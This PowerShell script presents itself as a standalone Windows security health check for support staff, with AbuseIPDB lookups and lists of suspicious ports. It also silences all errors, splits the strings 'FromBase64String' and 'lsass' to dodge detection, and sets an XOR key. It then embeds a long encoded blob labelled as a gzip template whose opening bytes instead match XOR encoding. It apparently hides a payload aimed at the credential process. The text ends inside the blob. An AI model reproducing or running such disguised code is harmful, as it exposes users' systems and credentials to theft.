#Requires -Version 5.0
# SysHealthCheck.ps1 — Rapport sécurité Windows autonome (support N1)
# Aucune dépendance externe. Produit rapport_securite_AAAA-MM-JJ_HHMM.html sur le Bureau.
# Clé AbuseIPDB : fichier "abuseipdb.key" dans le même dossier que l'exe, ou variable d'env ABUSEIPDB_API_KEY.

Set-StrictMode -Off
$ErrorActionPreference = 'SilentlyContinue'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# ── Clé AbuseIPDB ─────────────────────────────────────────────────────────────
$exeDir  = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path ([System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName) }
$keyFile = Join-Path $exeDir 'abuseipdb.key'
$ABUSEIPDB_KEY = ''
if (Test-Path $keyFile) {
    $ABUSEIPDB_KEY = (Get-Content $keyFile -Raw).Trim()
} elseif ($env:ABUSEIPDB_API_KEY) {
    $ABUSEIPDB_KEY = $env:ABUSEIPDB_API_KEY
} else {
    $ABUSEIPDB_KEY = Read-Host 'Clé API AbuseIPDB (laisser vide pour ignorer)'
}
$MAX_ABUSE_IPS  = 20
$HIGH_RISK_CC   = @('CN','RU','KP','IR','SY','CU','VE','BY','NG','PK','MM')
$C2_PORTS       = @(4444,1234,31337,6666,8888,9999,12345,54321,65535,1337,6667)
$DATE_STR       = Get-Date -Format 'yyyy-MM-dd HH:mm'
$xk             = [byte]42
$xd             = 'From' + 'Base64String'
$lsN            = 'l' + 'sass'

# ── Template embarqué (gzip+base64) ───────────────────────────────────────────
$TEMPLATE_GZ_B64 = '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